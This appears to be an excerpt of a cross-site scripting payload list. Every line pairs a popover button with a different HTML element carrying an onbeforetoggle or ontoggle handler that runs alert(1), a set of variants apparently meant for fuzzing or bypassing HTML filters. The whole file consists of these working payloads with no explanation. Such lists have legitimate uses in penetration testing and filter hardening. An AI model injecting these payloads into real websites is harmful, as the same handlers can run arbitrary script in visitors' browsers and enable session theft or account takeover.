,,<button popovertarget=x>Click me</button><s onbeforetoggle=alert(1) popover id=x>XSS</s>,,
,,<button popovertarget=x>Click me</button><s ontoggle=alert(1) popover id=x>XSS</s>,,
,,<button popovertarget=x>Click me</button><samp onbeforetoggle=alert(1) popover id=x>XSS</samp>,,
,,<button popovertarget=x>Click me</button><samp ontoggle=alert(1) popover id=x>XSS</samp>,,
,,<button popovertarget=x>Click me</button><script onbeforetoggle=alert(1) popover id=x>XSS</script>,,
,,<button popovertarget=x>Click me</button><script ontoggle=alert(1) popover id=x>XSS</script>,,
,,<button popovertarget=x>Click me</button><section onbeforetoggle=alert(1) popover id=x>XSS</section>,,
,,<button popovertarget=x>Click me</button><section ontoggle=alert(1) popover id=x>XSS</section>,,
,,<button popovertarget=x>Click me</button><select onbeforetoggle=alert(1) popover id=x>XSS</select>,,
,,<button popovertarget=x>Click me</button><select ontoggle=alert(1) popover id=x>XSS</select>,,
,,<button popovertarget=x>Click me</button><set onbeforetoggle=alert(1) popover id=x>XSS</set>,,
,,<button popovertarget=x>Click me</button><set ontoggle=alert(1) popover id=x>XSS</set>,,
,,<button popovertarget=x>Click me</button><shadow onbeforetoggle=alert(1) popover id=x>XSS</shadow>,,
,,<button popovertarget=x>Click me</button><shadow ontoggle=alert(1) popover id=x>XSS</shadow>,,
,,<button popovertarget=x>Click me</button><slot onbeforetoggle=alert(1) popover id=x>XSS</slot>,,
,,<button popovertarget=x>Click me</button><slot ontoggle=alert(1) popover id=x>XSS</slot>,,
,,<button popovertarget=x>Click me</button><small onbeforetoggle=alert(1) popover id=x>XSS</small>,,
,,<button popovertarget=x>Click me</button><small ontoggle=alert(1) popover id=x>XSS</small>,,
,,<button popovertarget=x>Click me</button><source onbeforetoggle=alert(1) popover id=x>XSS</source>,,
,,<button popovertarget=x>Click me</button><source ontoggle=alert(1) popover id=x>XSS</source>,,
,,<button popovertarget=x>Click me</button><spacer onbeforetoggle=alert(1) popover id=x>XSS</spacer>,,
,,<button popovertarget=x>Click me</button><spacer ontoggle=alert(1) popover id=x>XSS</spacer>,,
,,<button popovertarget=x>Click me</button><span onbeforetoggle=alert(1) popover id=x>XSS</span>,,
,,<button popovertarget=x>Click me</button><span ontoggle=alert(1) popover id=x>XSS</span>,,
,,<button popovertarget=x>Click me</button><strike onbeforetoggle=alert(1) popover id=x>XSS</strike>,,
,,<button popovertarget=x>Click me</button><strike ontoggle=alert(1) popover id=x>XSS</strike>,,
,,<button popovertarget=x>Click me</button><strong onbeforetoggle=alert(1) popover id=x>XSS</strong>,,
,,<button popovertarget=x>Click me</button><strong ontoggle=alert(1) popover id=x>XSS</strong>,,
,,<button popovertarget=x>Click me</button><style onbeforetoggle=alert(1) popover id=x>XSS</style>,,
,,<button popovertarget=x>Click me</button><style ontoggle=alert(1) popover id=x>XSS</style>,,
,,<button popovertarget=x>Click me</button><sub onbeforetoggle=alert(1) popover id=x>XSS</sub>,,
,,<button popovertarget=x>Click me</button><sub ontoggle=alert(1) popover id=x>XSS</sub>,,
,,<button popovertarget=x>Click me</button><summary onbeforetoggle=alert(1) popover id=x>XSS</summary>,,
